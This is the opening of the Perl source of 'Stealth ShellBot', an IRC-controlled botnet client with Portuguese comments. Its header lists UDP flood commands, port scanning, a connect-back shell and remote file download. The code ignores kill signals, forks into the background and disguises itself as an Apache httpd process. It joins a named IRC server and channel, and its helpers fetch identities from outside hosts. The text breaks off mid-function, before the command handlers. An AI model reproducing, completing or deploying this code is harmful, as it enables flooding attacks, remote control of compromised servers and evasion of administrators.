﻿#!/usr/bin/perl
# ShellBOT
# 0ldW0lf - oldwolf@atrix-team.org
# - www.atrix-team.org
# Stealth ShellBot Versão 0.2 by Thiago X
# Feito para ser usado em grandes redes de IRC sem IRCOP enchendo o saco :)
# Mudanças:
# - O Bot pega o nick/ident/name em uma URL e entra no IRC disfarçado :);
# - O Bot agora responde PINGs;
# - Você pode definir o prefixo dos comandos nas configurações;
# - Agora o Bot procurar pelo processo do apache para rodar como o apache :D;
# Comandos:
# - Adicionado comando !estatisticas <on/off>;
# - Alterado o comando @pacota para @oldpack;
# - Adicionado dois novos pacotadores: @udp <ip> <porta> <tempo> e @udpfaixa <faixa de ip> <porta> <tempo>;
# - Adicionado um novo portscan -> @fullportscan <ip> <porta inicial> <porta final>;
# - Adicionado comando @conback <ip> <porta> com suporte para Windows/Unix :D;
# - Adicionado comando: !sair para finalizar o bot;
# - Adicionado comando: !novonick para trocar o nick do bot por um novo aleatorio;
# - Adicionado comando !entra <canal> <tempo> e !sai <canal> <tempo>;
# - Adicionado comando @download <url> <arquivo a ser salvo>;
# - Adicionado comando !pacotes <on/off> para ativar/desativar pacotes :);

########## CONFIGURACAO ############
my $processo = '/usr/local/apache/bin/httpd -DSSL';

$servidor='irc.udplink.net' unless $servidor;
my $porta='6667';
my @canais=("#tcp");
my @adms=("wifi");

# Anti Flood ( 6/3 Recomendado )
my $linas_max=6;
my $sleep=3;

my $nick = getnick("iLeGaiS|");
my $ircname = getnick("ilegal");
my $realname = getnick("ilegal");

my $acessoshell = 1;
######## Stealth ShellBot ##########
my $prefixo = "!ilegais";
my $estatisticas = 0;
my $pacotes = 1;
####################################

my $VERSAO = '0.2a';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0";
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

#####################
# Stealth Shellbot #
#####################



sub getnick {
#my $retornonick = &_get("http://websurvey.burstmedia.com/names.txt");
#return $retornonick;
return "[TCP]".int(rand(1000));
}


sub getident {
my $retornoident = &_get("http://www.minpop.com/sk12pack/idents.php");
my $identchance = int(rand(100));
if ($identchance > 30) {
return $nick;
} else {
return $retornoident;
}
return $retornoident;
}

sub getname {
my $retornoname = &_get("http://www.minpop.com/sk12pack/names.php");
return $retornoname;
}

# IDENT TEMPORARIA - Pegar ident da url ta bugando o_o
sub getident2 {
my $length=shift;
$length = 3 if ($length < 3);

my @chars=('a'..'z','A'..'Z','1'..'9');
foreach (1..$length)
{
$randomstring.=$chars[rand @chars];
}
return $randomstring;
}

sub getstore ($$)
{
my $url = shift;
my $file = shift;

$http_stream_out = 1;
open(GET_OUTFILE, "> $file");
%http_loop_check = ();
_get($url);
close GET_OUTFILE;
return $main::http_get_result;
}

sub _get
{
my $url = shift;
my $proxy = "";
grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
my $host = $1;
my $port = $2 || 80;
my $path = $3;
$path = "/" unless defined($path);
return _trivial_http_get($host, $port, $path);
} elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
my $host = $1;
my $port = $2;
my $path = $url;
return _trivial_http_get($host, $port, $path);
} else {
return undef;
}
}


sub _trivial_http_get
{
my($host, $port, $path) = @_;
my($AGENT, $VERSION, $p);
#print "HOST=$host, PORT=$port, PATH=$path\n";

$AGENT = "get-minimal";
$VERSION = "20000118";

$path =~ s/ /%20/g;

require IO::Socket;
local($^W) = 0;
my $sock = IO::Socket::INET->new(PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp',
Timeout => 60) || return;
$sock->autoflush;
my $netloc = $host;
$netloc .= ":$port" if $port != 80;
my $request = "GET $path HTTP/1.0\015\012"
. "Host: $netloc\015\012"
. "User-Agent: $AGENT/$VERSION/u\015\012";
$request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
$request .= "\015\012";
print $sock $request;

my $buf = "";
my $n;
my $b1 = "";
while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
if ($b1 eq "") { # first block?
$b1 = $buf; # Save this for errorcode parsing
$buf =~ s/.+?\015?\012\015?\012//s; # zap header
}
if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
}
return undef unless defined($n);

$main::http_get_result = 200;
if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
$main::http_get_result = $1;
# print "CODE=$main::http_get_result\n$b1\n";
if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
# redirect
my $url
